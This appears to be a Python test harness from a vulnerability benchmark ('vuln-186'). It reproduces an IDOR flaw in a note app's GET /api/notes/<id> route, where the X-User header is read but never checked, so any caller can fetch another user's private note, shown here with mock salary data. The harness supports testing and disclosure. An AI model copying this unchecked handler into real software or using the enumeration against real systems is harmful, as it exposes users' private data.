#!/usr/bin/env python3
"""Harness for vuln-186: MemoBoard IDOR in GET /api/notes/<id>.

Extracts the real logic from src/app.py (api_note) and src/board/store.py (get_note),
mocks SQLite with the same schema and seed data from engine.py, and demonstrates
that an unauthenticated attacker can read any user's private note by id.
"""
import argparse
import sqlite3
from typing import Any

DB_PATH = "file:memoboard_harness?mode=memory&cache=shared"

MSGS = {
    "t1": ("Alice (X-User: alice) requests note_id=2", "Alice（X-User: alice）请求 note_id=2"),
    "t2": ("Anonymous (no X-User) requests note_id=2", "匿名（无 X-User）请求 note_id=2"),
    "t3": ("Empty X-User requests note_id=2", "空 X-User 请求 note_id=2"),
    "t4": ("Same result regardless of X-User", "无论 X-User 为何结果都相同"),
    "t5": ("Note enumeration (id=1 and id=2)", "枚举备忘录（id=1 与 id=2）"),
    "status": ("Status:", "状态:"),
    "author": ("Author:", "作者:"),
    "body": ("Body:", "正文:"),
}


def msg(key: str, zh: bool) -> str:
    en, zh_s = MSGS[key]
    return zh_s if zh else en


def _connect() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, uri=True)
    conn.row_factory = sqlite3.Row
    return conn


def get_note(note_id: int) -> dict[str, Any] | None:
    """Reproduces store.py:33-39 exactly."""
    with _connect() as conn:
        row = conn.execute(
            "SELECT id, author, title, body FROM notes WHERE id = ?",
            (note_id,),
        ).fetchone()
    return dict(row) if row else None


def init_and_seed():
    """Reproduces engine.py schema and seed data."""
    with _connect() as conn:
        conn.executescript(
            """
            CREATE TABLE IF NOT EXISTS notes (
                id INTEGER PRIMARY KEY,
                author TEXT NOT NULL,
                title TEXT NOT NULL,
                body TEXT NOT NULL
            );
            """
        )
        conn.executemany(
            "INSERT INTO notes(author, title, body) VALUES (?, ?, ?)",
            [
                ("alice", "welcome", "Ship the Q3 memo. Use the public board."),
                (
                    "bob",
                    "private-salary",
                    "Confidential: bob salary review = 128000. Do not share.",
                ),
            ],
        )


def api_note(note_id: int, request_headers: dict) -> tuple[int, dict | None]:
    """Reproduces app.py:73-84 api_note route handler logic exactly."""
    _current = (request_headers.get("X-User") or "").strip()
    row = get_note(note_id)
    if not row:
        return (404, None)
    return (200, row)


def main() -> int:
    p = argparse.ArgumentParser(description="MemoBoard IDOR harness")
    p.add_argument("--zh", action="store_true", help="Print labels in Chinese (default: English)")
    args = p.parse_args()
    zh = args.zh

    init_and_seed()
    results = []

    status, row = api_note(2, {"X-User": "alice"})
    print(msg("t1", zh))
    print(msg("status", zh), status)
    print(msg("author", zh), row["author"])
    print(msg("body", zh), row["body"])
    results.append(status == 200 and row["author"] == "bob" and "Confidential" in row["body"])

    status2, row2 = api_note(2, {})
    print(msg("t2", zh))
    print(msg("status", zh), status2)
    print(msg("author", zh), row2["author"])
    print(msg("body", zh), row2["body"])
    results.append(status2 == 200 and row2["author"] == "bob")

    status3, row3 = api_note(2, {"X-User": ""})
    print(msg("t3", zh))
    print(msg("status", zh), status3)
    print(msg("author", zh), row3["author"])
    results.append(status3 == 200 and row3["author"] == "bob")

    s_alice, r_alice = api_note(2, {"X-User": "alice"})
    s_bob, r_bob = api_note(2, {"X-User": "bob"})
    s_admin, r_admin = api_note(2, {"X-User": "admin"})
    no_check = s_alice == s_bob == s_admin == 200 and r_alice == r_bob == r_admin
    print(msg("t4", zh), no_check)
    print(r_alice)
    results.append(no_check)

    s1, r1 = api_note(1, {"X-User": "attacker"})
    s2, r2 = api_note(2, {"X-User": "attacker"})
    print(msg("t5", zh))
    print(r1)
    print(r2)
    results.append(s1 == 200 and s2 == 200 and r1["author"] == "alice" and r2["author"] == "bob")

    print(f"{sum(results)}/{len(results)}")
    return 0 if all(results) else 1


if __name__ == "__main__":
    raise SystemExit(main())
